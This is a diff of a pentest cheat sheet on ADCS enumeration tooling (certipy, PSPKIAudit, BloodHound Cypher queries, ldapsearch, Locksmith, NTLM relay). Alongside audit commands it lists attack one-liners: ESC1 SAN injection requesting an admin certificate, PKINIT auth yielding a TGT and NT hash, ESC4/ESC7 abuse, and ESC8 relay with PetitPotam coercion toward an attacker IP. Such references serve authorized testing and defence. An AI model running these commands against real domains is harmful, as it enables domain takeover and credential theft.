@@ -3,7 +3,7 @@ aliases:
   - ADCS Tooling
   - certipy
   - PSPKIAudit
-  - BloodHound ADCS
+  - Locksmith
 tags:
   - type/cheatsheet
   - vuln/ad-enumeration
@@ -15,341 +15,140 @@ tertiary categories: null
 type: CheatSheet
 linked:
   - "[[AD - ADCS Enumeration]]"
-  - "[[BloodHound & SharpHound]]"
+  - "[[netexec]]"
 ---
 # AD - ADCS Enumeration - Tooling
 
 ***
 
-## certipy (Linux Standard)
+## certipy (Linux)
 
-| **Comando** | **Output** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `certipy find -u user -p pass -dc-ip DC` | Comprehensive ADCS recon | Standard. |
-| `certipy find -enabled` | Enabled templates only | Filter. |
-| `certipy find -vulnerable` | ESC1-ESC15 vulnerable | Critical. |
-| `certipy find -text -stdout` | Text output | Standard. |
-| `certipy find -json -output adcs.json` | JSON | Parseable. |
-| `certipy find -bloodhound` | BloodHound-friendly | Tool integration. |
-| `certipy req -ca CA -template T` | Cert request | Standard. |
-| `certipy auth -pfx cert.pfx` | Use cert for auth | Standard. |
-| `certipy shadow auto -account victim` | Shadow Credentials | Adjacent. |
-| `certipy ca -ca CA -add-officer attacker` | ESC7 abuse | Privileged. |
-| `certipy ca -ca CA -enable-template T` | Enable disabled template | Adjacent. |
-| `certipy relay -ca CA -target dc01` | ESC8 modern | Standard. |
-| `certipy template -template T -save backup.json` | Backup template | Adjacent. |
-| Authenticated NTLM | Standard | Standard. |
-| Kerberos auth `-k` | Modern | Adjacent. |
-| Modern Linux preferred | Standard | Standard. |
+| `certipy find -u u@corp.local -p pass -dc-ip <DC>` | CAs + templates auto | Standard. |
+| `certipy find -u u@corp.local -p pass -dc-ip <DC> -vulnerable -stdout` | Solo vulnerables | Quick. |
+| `certipy find -u u -p pass -dc-ip <DC> -text -output corp` | Output text + JSON | Audit. |
+| `certipy req -u u -p pass -ca <CA> -template <T>` | Request cert | Standard enroll. |
+| `certipy req -u u -p pass -ca <CA> -template <T> -upn 'admin@corp.local'` | ESC1 exploit | SAN injection. |
+| `certipy auth -pfx <cert>.pfx -dc-ip <DC>` | PKINIT auth | Cert → TGT/hash. |
+| `certipy shadow auto -u u -p pass -account victim -dc-ip <DC>` | Shadow Cred | Privesc. |
+| `certipy ca -u u -p pass -ca <CA> -issue-request <id>` | ESC7 approve | Privesc. |
+| `certipy template -u u -p pass -dc-ip <DC> -template <T> -save-old` | ESC4 modify template | Privesc + cleanup. |
+| `certipy relay -target http://<CA>/certsrv/certfnsh.asp -ca <CA> -template DomainController` | ESC8 built-in relay | All-in-one. |
 ^ad-adcstool-certipy
-
-### certipy comprehensive workflow
-
-```bash
-# Comprehensive ADCS recon
-certipy find -u user@dom.local -p pass -dc-ip DC -text -stdout
-
-# Vulnerable templates only
-certipy find -u user -p pass -dc-ip DC -vulnerable -stdout
-
-# JSON output
-certipy find -u user -p pass -dc-ip DC -vulnerable -json -output adcs.json
-
-# Per-template request (ESC1)
-certipy req -u user -p pass -dc-ip DC \
-  -ca CA-Name -template VulnTemplate \
-  -upn administrator@dom.local
-
-# Use cert for auth
-certipy auth -pfx administrator.pfx -dc-ip DC
-
-# Output: TGT + NT hash
-```
 
 ___
 
-## PSPKIAudit (Windows PowerShell)
+## PSPKIAudit (Windows)
 
-| **Comando** | **Output** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Invoke-PKIAudit` | Comprehensive audit | Standard. |
-| `Get-CertificationAuthority` | List CAs | Standard. |
-| `Get-CertificateTemplate` | List templates | Standard. |
-| `Get-CertificateTemplateAcl` | Per-template DACL | Standard. |
-| `Get-CertificationAuthorityAcl` | Per-CA DACL | Standard. |
-| `Get-IssuedCertificate` | Issued certs | Standard. |
-| `Get-PendingCertificateRequest` | Pending requests | Adjacent. |
-| `Get-CertRequestStatusCode` | Request status | Adjacent. |
-| Native PowerShell module | Modern | Standard. |
-| Comprehensive Windows-side audit | Standard | Standard. |
-| Output: detailed reports | Standard | Standard. |
-| Cross-correlate with priv | Standard | Audit. |
-| Detection: PSPKIAudit usage | Edge | Adjacent. |
-| Compliance: red team / defender both | Standard | Standard. |
-| Audit baseline | Standard | Compliance. |
-| Modern: comprehensive coverage | Standard | Standard. |
+| `Import-Module PSPKIAudit` | Carga módulo | Pre-cmdlet. |
+| `Invoke-PKIAudit` | Audit comprehensive | Standard. |
+| `Get-CertificationAuthority` (PSPKI) | CAs Enterprise | Inventory. |
+| `Get-CertificateTemplate` (PSPKI) | Templates | Inventory. |
+| `Get-CertificateTemplateAcl` (PSPKI) | DACL templates | ACL audit. |
+| `Get-AuditCertificateTemplate -Vulnerable` | Templates vulnerables | Hunt. |
 ^ad-adcstool-pspki
 
-### PSPKIAudit usage
-
 ```powershell
-# Install
-Install-Module PSPKI
-Install-Module PSPKIAudit
-Import-Module PSPKIAudit
-
-# Comprehensive audit
-Invoke-PKIAudit
-
-# Per-section
-Get-CertificationAuthority
-Get-CertificateTemplate
-
-# Per-template ACL
-Get-CertificateTemplate | ForEach-Object {
-  Get-CertificateTemplateAcl -Template $_ |
-    Select-Object Name,@{n='Access';e={$_.Access}}
-}
+git clone https://github.com/GhostPack/PSPKIAudit
+Import-Module .\PSPKIAudit\PSPKIAudit.psd1
+Invoke-PKIAudit | Format-Table
 ```
 
 ___
 
 ## RSAT / Native Windows
 
-| **Comando** | **Output** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Get-AdcsServiceObject` | CAs | Native. |
-| `certutil -CAInfo` | CA detail | Standard. |
-| `certutil -getreg` | CA registry | Standard. |
-| `certutil -getreg policy\EditFlags` | EDITF flags | Critical. |
-| `certutil -config "CA-IP\CA-Name" ...` | Per-CA target | Standard. |
-| `pkiview.msc` | GUI | Adjacent. |
-| `certtmpl.msc` | Template GUI | Adjacent. |
-| `certsrv.msc` | CA GUI | Adjacent. |
-| `certreq.exe` | Request CLI | Standard. |
-| `Get-ADObject -SearchBase "CN=Public Key Services,..."` | LDAP query | Standard. |
-| `Get-Acl "AD:..."` per-template | DACL audit | Standard. |
-| Native Windows utilities | Always available | Standard. |
-| Modern PowerShell preferred | Standard | Standard. |
-| Cross-correlate with PSPKIAudit | Standard | Adjacent. |
-| OPSEC: native less suspicious | Standard | OPSEC. |
-| Compliance: defender baseline | Standard | Adjacent. |
+| `certutil -dsTemplate` | Templates raw | Sin RSAT-AD CS. |
+| `certutil -CAInfo` | CA flags (incluye EDITF) | ESC6 check. |
+| `certutil -viewstore -enterprise NTAuth` | NTAuth Store | Audit. |
+| `certutil -ping -config <CA-name>` | CA reachability | Pre-attack. |
+| `Get-CertificationAuthority` (PSPKI con RSAT-AD CS) | CAs | Standard. |
+| `Get-CertificateTemplate` (PSPKI) | Templates | Standard. |
 ^ad-adcstool-native
-
-### Native commands
-
-```cmd
-:: CA list
-certutil -config - -ping
-
-:: Per-CA detail
-certutil -CAInfo
-
-:: EDITF flags check (ESC6)
-certutil -config "CA-IP\CA-Name" -getreg policy\EditFlags
-
-:: Per-CA settings
-certutil -config "CA-IP\CA-Name" -getreg
-```
-
-```powershell
-# RSAT
-Get-AdcsServiceObject
-
-# LDAP container query
-Get-ADObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADRootDSE).RootDomainNamingContext)" -Filter *
-
-# Per-template DACL
-$tmpl = "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dom,DC=local"
-Get-Acl "AD:$tmpl"
-```
 
 ___
 
-## BloodHound ADCS Edges
+## BloodHound ADCS
 
-| **Edge** | **Significado** | **Notas** |
+| **Cypher** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Enroll` | Template enrollment right | Standard. |
-| `AutoEnroll` | Auto-enrollment | Adjacent. |
-| `EnrollOnTemplate` | Direct template enroll | Modern. |
-| `EnrollOnNTAuthCertStore` | NTAuth modify | Adjacent. |
-| `Owns`, `WriteOwner`, `WriteDacl` on Template/CA | ACL combo | Standard. |
-| `GenericAll`, `GenericWrite` on Template/CA | Standard | Standard. |
-| `WritePKINameFlag` | Modify name flags | Modern. |
-| `WritePKIEnrollmentFlag` | Modify enrollment flags | Modern. |
-| `ManageCA` | ESC7 right | Modern. |
-| `ManageCertificates` | ESC7 right | Modern. |
-| BloodHound CE 5.x+ ADCS | Comprehensive | Tool. |
-| BHCE 6.x improved ADCS | Modern | Tool. |
-| Cypher: ESC1-ESC15 paths | Custom | Tool. |
-| Visual graph: ADCS nodes | Helpful | Standard. |
-| Per-domain ingest | Multi-domain | Adjacent. |
-| Compliance: ADCS baseline queries | Standard | Adjacent. |
+| `MATCH (t:CertTemplate {enrolleeSuppliesSubject:true,hasAuthenticationEKU:true}) RETURN t` | ESC1 templates | Standard. |
+| `MATCH (u)-[:Enroll]->(t:CertTemplate) RETURN u,t` | Enroll edges | Standard. |
+| `MATCH (u)-[:ManageCA\|ManageCertificates]->(c:EnterpriseCA) RETURN u,c` | ESC7 surface | Critical. |
+| `MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) WHERE any(n IN nodes(p) WHERE n:CertTemplate OR n:EnterpriseCA) RETURN p` | Privesc paths via ADCS | Path. |
+| BHCE pre-built "ADCS" queries | GUI panel | Standard. |
 ^ad-adcstool-bh
 
-### BloodHound ADCS queries
+```bash
+# SharpHound captura ADCS edges con -c All (BHCE 4.x+)
+.\SharpHound.exe -c All
 
-```cypher
-// All ESC1 paths
-MATCH (u {owned: true})-[:Enroll|AutoEnroll|MemberOf*1..]->(t:CertTemplate)
-WHERE t.enrolleesuppliessubject = true
-  AND t.authenticationenabled = true
-  AND t.requiresmanagerapproval = false
-  AND t.authorizedsignatures = 0
-RETURN u.name, t.name
-
-// ESC4: template ACL paths
-MATCH (u {owned: true})-[:Owns|WriteOwner|WriteDacl|GenericAll|GenericWrite|WritePKINameFlag|WritePKIEnrollmentFlag*1..]->(t:CertTemplate)
-RETURN u.name, t.name
-
-// ESC7: Manage CA paths
-MATCH (u {owned: true})-[:ManageCA|ManageCertificates|MemberOf*1..]->(c:CA)
-RETURN u.name, c.name
-
-// All paths to DA via ADCS
-MATCH (u {owned: true}), (g:Group {name: "DOMAIN ADMINS@DOM.LOCAL"})
-MATCH p=shortestPath((u)-[*1..]->(g))
-WHERE ANY(rel IN relationships(p) WHERE type(rel) IN ["Enroll","AutoEnroll","ManageCA","ManageCertificates","WritePKINameFlag","WritePKIEnrollmentFlag"])
-RETURN p
+# Linux
+bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip
 ```
 
 ___
 
 ## ldapsearch / Linux LDAP
 
-| **Comando** | **Output** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| LDAP enumerate templates | `(objectClass=pKICertificateTemplate)` | Direct. |
-| LDAP enumerate CAs | `(objectClass=pKIEnrollmentService)` | Direct. |
-| LDAP NTAuth | `CN=NTAuthCertificates,...` | Standard. |
-| Per-attribute query | Custom | Standard. |
-| Cross-correlate templates + CAs | Standard | Adjacent. |
-| Authenticated bind | Standard | Reliable. |
-| LDAPS | Encrypted | Standard. |
-| Linux native | Standard | Standard. |
-| Cross-domain via GC | Edge | Adjacent. |
-| Output LDIF | Default | Standard. |
-| Modern: certipy preferred wrapper | Standard | Standard. |
-| Adjacent: bloodyAD | LDAP modify | Adjacent. |
-| Detection: bulk LDAP queries | Defender | Adjacent. |
-| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
-| Modern: BHCE preferred | Standard | Tool. |
-| Compliance: red team scoped | Standard | OPSEC. |
+| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectClass=pKIEnrollmentService)" cn dnsHostName certificateTemplates` | CAs raw | Linux. |
+| `ldapsearch ... -b "CN=Certificate Templates,CN=Public Key Services,..." "(objectClass=pKICertificateTemplate)" cn pkiExtendedKeyUsage msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag` | Templates raw | Linux. |
+| `ldapsearch ... -b "CN=NTAuthCertificates,..." -s base "(objectClass=*)" cACertificate` | NTAuth raw | Linux. |
 ^ad-adcstool-ldapsearch
-
-### ldapsearch ADCS templates
-
-```bash
-# All templates
-ldapsearch -h DC -D 'dom\u' -w pass \
-  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dom,DC=local" \
-  "(objectClass=pKICertificateTemplate)" \
-  cn displayName flags pKIExtendedKeyUsage \
-  msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag \
-  msPKI-RA-Signature
-
-# All CAs
-ldapsearch -h DC -D 'dom\u' -w pass \
-  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=dom,DC=local" \
-  "(objectClass=pKIEnrollmentService)" \
-  cn dnsHostName cACertificate
-```
 
 ___
 
 ## ADRecon / Bulk Reports
 
-| **Tool** | **Output** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| ADRecon ADCS section | XLSX | Standard. |
-| `.\ADRecon.ps1 -Method LDAP -Collect ADCS` | Targeted | Adjacent. |
-| ADCollector .NET | Faster | Standard. |
-| PingCastle ADCS | Defender | Standard. |
-| Purple Knight ADCS | Defender | Standard. |
-| Microsoft Defender for Identity ADCS | Modern | Defender. |
-| BloodyAD ADCS modify | Privileged | Adjacent. |
-| Custom Python + ldap3 | DIY | Standard. |
-| Cross-correlate with priv | Standard | Adjacent. |
-| Per-CA bulk audit | Standard | Compliance. |
-| Compliance: documented baseline | Standard | Adjacent. |
-| Modern: continuous monitoring | Defender | Standard. |
-| Detection: bulk ADCS modify | Defender | Adjacent. |
-| Audit log retention | Standard | Adjacent. |
-| Stale ADCS configs | Audit | Standard. |
-| Cleanup post-engagement | Standard | OPSEC. |
+| `.\ADRecon.ps1 -DomainController <DC> -OutputType Excel` | Excel multi-sheet (incluye sheets PKI) | Auditor. |
+| `ADRecon-ADCS` (extension) | ADCS-specific report | Targeted. |
+| `Invoke-Locksmith` | ADCS audit PowerShell native | Quarterly. |
 ^ad-adcstool-bulk
 
-### ADRecon ADCS
-
 ```powershell
-# ADRecon comprehensive (includes ADCS)
-.\ADRecon\ADRecon.ps1 -Method LDAP -DomainController DC -Collect ADCS
-
-# Output: ADRecon-Report-...\ADCS_*.xlsx
+# Locksmith (ADCS audit comprehensive)
+Install-Module Locksmith
+Invoke-Locksmith -Mode 1
+# Output: ADCS misconfigs + remediation suggestions
 ```
 
 ___
 
 ## NTLM Relay Tools (ESC8)
 
-| **Tool** | **Comando** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| ntlmrelayx (Impacket) | Standard | Standard. |
-| `ntlmrelayx --target http://CA/certsrv/certfnsh.asp --adcs --template DomainController` | ESC8 standard | Standard. |
-| `ntlmrelayx -tf targets.txt --adcs` | Bulk | Adjacent. |
-| `ntlmrelayx --target https://CA/certsrv/...` | HTTPS variant | Standard. |
-| certipy relay | Modern alternative | Standard. |
-| `certipy relay -ca CA -target dc01` | Modern | Standard. |
-| krbrelayx | Adjacent Kerberos | Adjacent. |
-| Coercion tools | PetitPotam, PrinterBug, etc. | Standard. |
-| Combined: coercion + relay → cert | Standard chain | Standard. |
-| Detection: relay events | Defender | Adjacent. |
-| Modern: extreme alerting | Best practice | Standard. |
-| Cleanup: revert cert issuance | Standard | OPSEC. |
-| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
-| Adjacent: Coercion hub | Cross-ref | Adjacent. |
-| Compliance: red team scoped | Standard | OPSEC. |
-| Audit log retention | Standard | Adjacent. |
+| `ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController` | Standard NTLM Relay | ESC8. |
+| `certipy relay -target http://<CA>/certsrv/certfnsh.asp -ca <CA> -template DomainController` | Built-in certipy relay | All-in-one. |
+| `PetitPotam.py -u u -p pass <attacker-IP> <victim>` | Coercion source | NTLM trigger. |
+| `dfscoerce.py -u u -p pass <attacker-IP> <victim>` | Alt coercion | Si PetitPotam patched. |
+| `Coercer.py coerce -t <victim> -l <attacker-IP> -u u -p pass -d corp.local` | Multi-method | Comprehensive. |
 ^ad-adcstool-relay
-
-### ESC8 chain tools
-
-```bash
-# Terminal 1: ntlmrelayx
-sudo ntlmrelayx.py \
-  -t http://CA/certsrv/certfnsh.asp \
-  --adcs --template DomainController \
-  --no-smb-server
-
-# Terminal 2: PetitPotam
-python3 PetitPotam.py ATTACKER_IP DC_IP
-
-# Modern alternative: certipy relay
-certipy relay -ca CA-Name -target dc01.dom.local
-```
 
 ___
 
-## Wordlists & Recursos
+## Recursos
 
-| **Recurso** | **URL / Path** | **Notas** |
-|:---:|:---:|:---:|
-| HackTricks - ADCS | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates` | Reference. |
-| The Hacker Recipes - ADCS | `thehacker.recipes/ad/movement/ad-cs` | Comprehensive. |
-| Certipy docs | `github.com/ly4k/Certipy` | Tool. |
-| PSPKIAudit | `github.com/GhostPack/PSPKIAudit` | Tool. |
-| SpecterOps - "Certified Pre-Owned" | Whitepaper | Foundational ESC research. |
-| Will Schroeder - ADCS | Specter Ops blog | Research. |
-| Lee Christensen - ADCS | Specter Ops blog | Research. |
-| BloodHound docs | `bloodhound.specterops.io` | Tool. |
-| Microsoft - ADCS Documentation | `learn.microsoft.com/en-us/windows-server/identity/ad-cs/` | Vendor. |
-| Microsoft Defender for Identity ADCS | Modern | Defender. |
-| PingCastle | `www.pingcastle.com` | Audit. |
-| Purple Knight | `www.semperis.com/purple-knight/` | Audit. |
-| MITRE ATT&CK T1649 | Steal or Forge Authentication Certificates | Adjacent. |
-| `awesome-active-directory` | GitHub | Foundation. |
-| CVE-2022-26923 (Certifried) | Patched | Adjacent. |
+| **Recurso** | **URL** |
+|:---:|:---:|
+| certipy | `https://github.com/ly4k/Certipy` |
+| Certify (Windows) | `https://github.com/GhostPack/Certify` |
+| PSPKIAudit | `https://github.com/GhostPack/PSPKIAudit` |
+| Locksmith | `https://github.com/TrimarcJake/Locksmith` |
+| SpecterOps "Certified Pre-Owned" whitepaper | `https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf` |
+| HackTricks ADCS | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates` |
+| The Hacker Recipes — ADCS | `https://www.thehacker.recipes/ad/movement/adcs` |
+| Microsoft KB5014754 (Certifried) | `https://support.microsoft.com/help/5014754` |
+| Akamai ESC13/ESC14 research | `https://www.akamai.com/blog/security-research/active-directory-certificate-services-esc13` |
 ^ad-adcstool-resources
 
 ***
